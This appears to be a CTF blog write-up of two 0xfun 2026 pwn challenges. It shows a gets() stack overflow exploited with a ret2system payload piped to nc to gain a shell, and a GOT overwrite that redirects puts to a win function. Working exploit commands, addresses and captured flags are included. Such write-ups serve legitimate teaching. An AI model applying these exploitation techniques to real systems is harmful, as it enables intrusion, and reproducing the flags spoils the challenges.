@@ -1,0 +1,210 @@
+---
+layout: post
+title:  "Pwn Challenges"
+date:   2026-02-14 16:47:00 -0400
+author: robo.uzi
+tags: [CTF]
+permalink: /0xfun-2026-pwn-challenges/
+---
+* TOC
+{:toc}
+
+## Fridge
+
+**Category**: pwn
+
+**Author**: x03e
+
+**Description**: We've experienced a data breach! Our forensics team detected unusual network activity originating from our new smart refrigerator. It turns out there's an old debugging service still running on it. Now it’s your job to figure out how the attackers gained access to the fridge! Suffering ends in 30 minutes. `nc chall.0xfun.org 12838`. 
+
+I get the challenge file:
+```shell
+file vuln  
+vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=6fee5419f26fbcbac3ff79a35b94dc4cb908b71e, for GNU/Linux 3.2.0, not stripped
+
+checksec --file=vuln  
+[*] '/home/user/Desktop/ctf/0xfun2026/vuln'  
+Arch:       i386-32-little  
+RELRO:      Partial RELRO  
+Stack:      No canary found  
+NX:         NX enabled  
+PIE:        No PIE (0x8048000)  
+Stripped:   No
+```
+
+When I run the binary I see this:
+```shell
+./vuln  
+---------FridgeNet---------  
+FridgeNet v0.3.7  
+  
+Changelog:  
+- Fixed typo in welcome message  
+- Fixed issue that allowed bad actors to get /bin/sh  
+  
+  
+Type:  
+1       Display fridge contents  
+2       Set fridge welcome message  
+3       Exit  
+  
+>
+```
+
+Putting the binary into ghidra I see there is a buffer overflow in the `set_welcome_message()` function:
+```shell
+void set_welcome_message(void)
+
+{
+  char local_30 [32];
+  FILE *local_10;
+  
+  puts("New welcome message (up to 32 chars):");
+  gets(local_30);
+  local_10 = fopen(config_filepath,"w");
+  if (local_10 == (FILE *)0x0) {
+    puts("Unable to open config file.");
+                    /* WARNING: Subroutine does not return */
+    exit(1);
+  }
+  fprintf(local_10,"welcome_msg: %s",local_30);
+  fclose(local_10);
+  return;
+}
+```
+It allocates 32 bytes but has no bounds checking.
+
+I find the address to `/bin/sh` with `ROPgadget`:
+```shell
+ROPgadget --binary vuln --string "/bin/sh"  
+Strings information  
+============================================================  
+0x0804a09a : /bin/sh
+```
+
+Using `gdb`, and `cyclic()` and `cyclic_find()` from pwntools. `cyclic_find()` shows the offset is 44 bytes. Add 4 bytes for stack alignment. 
+
+Find the addresses for `system` and `exit`:
+```shell
+objdump -d vuln | grep system  
+080490a0 <system@plt>:  
+8049214:       e8 87 fe ff ff          call   80490a0 <system@plt>  
+
+objdump -d vuln | grep exit  
+080490b0 <exit@plt>:  
+804928e:       e8 1d fe ff ff          call   80490b0 <exit@plt>
+```
+
+Get a shell and read the flag:
+```shell
+(echo "2"; python3 -c "from pwn import *; import sys; sys.stdout.buffer.write(flat(b'A'*48, 0x080490a0, 0x080490b0, 0x0804a09a)); sys.stdout.buffer.write(b'\n')"; cat) | nc chall.0xfun.org 12838  
+---------FridgeNet---------  
+FridgeNet v0.3.7  
+  
+Changelog:  
+- Fixed typo in welcome message  
+- Fixed issue that allowed bad actors to get /bin/sh  
+  
+  
+Type:  
+1       Display fridge contents  
+2       Set fridge welcome message  
+3       Exit  
+  
+> New welcome message (up to 32 chars):  
+cat flag.txt  
+0xfun{4_ch1ll1ng_d1sc0v3ry!p1x3l_b3at_r3v3l4t1ons_c0d3x_b1n4ry_s0rcery_unl3@sh3d!}
+```
+
+`0xfun{4_ch1ll1ng_d1sc0v3ry!p1x3l_b3at_r3v3l4t1ons_c0d3x_b1n4ry_s0rcery_unl3@sh3d!}`
+
+___
+
+## What you have
+
+**Category**: pwn
+
+**Author**: x03e
+
+**Description**: Bring it on! Show me EVERYTHING you’ve got! I want to see all you've got! Suffering ends in 30 minutes. `nc chall.0xfun.org 52079`.
+
+I get the challenge file:
+```shell
+file chall  
+chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
+
+checksec --file=chall  
+[*] '/home/user/Desktop/ctf/0xfun2026/chall'  
+Arch:       amd64-64-little  
+RELRO:      No RELRO  
+Stack:      Canary found  
+NX:         NX enabled  
+PIE:        No PIE (0x400000)  
+SHSTK:      Enabled  
+IBT:        Enabled  
+Stripped:   No
+```
+The binary has no PIE and no RELRO meaning function addresses are static and the GOT is writable.
+
+I put the binary in ghidra and this is the main function:
+```shell
+undefined8 main(void)
+
+{
+  long in_FS_OFFSET;
+  undefined8 *local_20;
+  undefined8 local_18;
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  setbuf(stdout,(char *)0x0);
+  puts("Show me what you GOT!");
+  __isoc99_scanf(&DAT_0040206b,&local_20);
+  puts("Show me what you GOT! I want to see what you GOT!");
+  __isoc99_scanf(&DAT_0040206b,&local_18);
+  *local_20 = local_18;
+  puts("Goodbye!");
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+}
+```
+The program lets you write any 8 byte value (`*local_20 = local_18;`) to any address then calls `puts("Goodbye!")`.
+
+I need to overwrite the GOT entry for `puts` with the address of the `win` function. When the program calls `puts("Goodbye!")` it will execute `win()` instead and print the flag.
+
+Find the addresses for `win()` and `puts@GOT`:
+```shell
+objdump -R chall | grep puts  
+0000000000403430 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
+
+objdump -d chall | grep win  
+0000000000401236 <win>:  
+4012b3:       75 19                   jne    4012ce <win+0x98>
+```
+
+```shell
+python3 -c "print(int('0x403430',16))"  
+4207664
+
+python3 -c "print(int('0x401236',16))"  
+4198966
+```
+
+Connect to the server and get the flag:
+```shell
+nc chall.0xfun.org 52079  
+Show me what you GOT!  
+4207664  
+Show me what you GOT! I want to see what you GOT!  
+4198966  
+I like what you GOT! Take this: 0xfun{g3tt1ng_schw1fty_w1th_g0t_0v3rwr1t3s_1384311_m4x1m4l}  
+.  
+^C
+```
+
+`0xfun{g3tt1ng_schw1fty_w1th_g0t_0v3rwr1t3s_1384311_m4x1m4l}`
+
+___
